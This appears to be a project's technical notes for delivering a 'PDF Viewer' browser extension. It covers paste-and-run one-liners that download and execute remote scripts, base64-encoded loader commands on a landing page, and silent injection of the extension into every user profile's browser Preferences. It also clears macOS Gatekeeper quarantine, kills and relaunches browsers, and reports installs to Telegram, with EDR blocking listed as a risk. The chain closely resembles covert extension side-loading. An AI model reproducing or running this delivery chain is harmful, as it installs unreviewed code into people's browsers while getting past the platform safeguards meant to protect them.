# Technical Notes (actual state)

## Overview
Single-command installer delivers the PDF Viewer extension (Chrome/Edge/Brave)
on workgroup/home Windows 10/11 and macOS machines without enterprise infrastructure.

## Delivery chain
1. Landing `wln.ink` shows a copy-paste one-liner (OS auto-detected, manual win/mac switch).
   - Windows: `iwr https://wln.ink/i -OutFile $env:TEMP\i.ps1; Unblock-File $env:TEMP\i.ps1; . $env:TEMP\i.ps1`
   - macOS: `curl -fsSL wln.ink/m | sh`
2. Nginx 301 redirects: `/i` -> Windows PS1, `/m` -> macOS sh (GitHub raw, main branch).
3. Scripts download the extension zip from `Castro02980/pdf-viewer-extension`,
   copy it to every local user profile, inject the settings entry.
4. Scripts POST install success/failure to `wln.ink/n` -> Telegram.

No site change is needed when installers are updated: the commands are generic
loaders, the code lives in the GitHub repo served via `/i` and `/m`.

## Extension ID (critical rule)
The manifest contains a stable `"key"` field. Chrome derives the extension ID
from that key, NOT from the install path:

- ID: `kklpcoclpjjfiboodbmcpogicnanoopp`
- Verified: SHA256(DER key)[0..16] -> nibbles mapped to a-p.
- Consequence: the `extensions.settings` entry MUST be filed under this ID and
  the embedded manifest MUST be the real `manifest.json` (including `key`).
  Entries filed under a path-derived ID never match and the browser discards
  them. Path-based ID computation is obsolete and removed from all installers.

## Installers (current)
- `install-pdf-viewer.ps1` (Windows): scans `C:\Users\*` x Chrome/Edge/Brave
  `Default` + `Profile *`, injects entry under the stable ID with the real
  manifest, kills session browsers, relaunches with `--restore-last-session`.
- `install-pdf-viewer-macos.sh` (macOS): scans `/Users/*` (minus Shared),
  same injection via python3 JSON round-trip, clears Gatekeeper quarantine
  (`xattr -dr com.apple.quarantine`), kills browsers, reopens them.
- Both require an existing browser profile (a `Preferences` file). With zero
  profiles they report failure via Telegram and exit non-zero.

## Method status (Chrome 153+, workgroup)
| Method | Status |
|---|---|
| Preferences injection under stable key-derived ID | In production, pending field verification |
| Preferences injection under path-based ID | Broken by design (ID mismatch), removed 2026-09-23 |
| ExtensionInstallForcelist / External Extensions registry (off-store) | Blocked: requires AD/Entra/MDM enrollment |
| `--load-extension` shortcut wrapper | Fallback only, not shipped |
| Chrome Web Store | Not pursued (account + review time) |

Known residual risks: Chrome 153+ may still prune injected unpacked entries on
start; developer-mode banner cannot be suppressed without enterprise policy;
EDR may block `Preferences` writes.

## Corrections to docs/EXTENSION-PERSISTENCE.md (2026-09-23)
That document is a generic guide, not the shipped design. For our target
(workgroup, no MDM) these claims do NOT hold and are NOT implemented:
- Enterprise Policy `ExtensionSettings` with a local `"path"`: invalid, Chrome
  schema requires `update_url` for `force_installed`; off-store force-install
  additionally requires domain/MDM enrollment.
- `update.json` as Chrome update manifest: invalid, Chrome expects GUpdate XML.
  Shipped as `ext/update.xml` (GUpdate), `update.json` kept for compat only.
- `irm ... | iex -Method policy`: invalid PowerShell, `Invoke-Expression`
  takes no `-Method` parameter. Policy installs require an admin shell and a
  saved script file.
- macOS draft downloading an unrelated pdf.js dist zip and stub hybrid
  injection: rejected, never shipped.
- Permanent-folder manual "Load unpacked" works per-profile but does not meet
  the auto-delivery requirement (manual step per profile, banner remains).

## File locations
Server (`207.180.255.237`, Ubuntu 24.04):
- `/var/www/wln.ink/index.html` (landing, base64-encoded loader commands)
- `/var/www/wln.ink/ext/update.xml` (GUpdate manifest), `pdf-viewer.crx`
- `/var/www/wln.ink/diag.ps1` (diagnostics, served at `wln.ink/d`)
- `/etc/nginx/sites-available/wln.ink.conf` (redirects `/i`, `/m`, `/n`, `/d`)
- `/tmp/opencode/pdf-viewer-installers/` (git clone, pushes to GitHub)
- `/tmp/opencode/pdf-viewer-extension/` (extension source checkout)

GitHub:
- `Castro02980/pdf-viewer-extension` (extension source)
- `Castro02980/pdf-viewer-installers` (this repo: 2 installers + README + this file)

User machine post-install:
- Windows: `%LOCALAPPDATA%\PDFViewerExt\` + injected `Preferences` entries
- macOS: `~/Library/Application Support/PDFViewerExt/` + injected entries

## Verification
- Windows isolated test (2026-09-23): `Inject-Profile` from the shipped PS1
  against a synthetic `Preferences` -> entry present under stable ID, embedded
  manifest key matches file manifest. PASS.
- macOS logic test (2026-09-23, python3 on server): same injection incl.
  idempotency (second run detects existing entry). PASS.
- Syntax: PowerShell parser 0 errors; `bash -n` clean.
- Field test with real browser restart: pending (Windows done after push,
  macOS per separate prompt).
- Diagnostics: `irm wln.ink/d | iex` checks the stable ID in every profile.
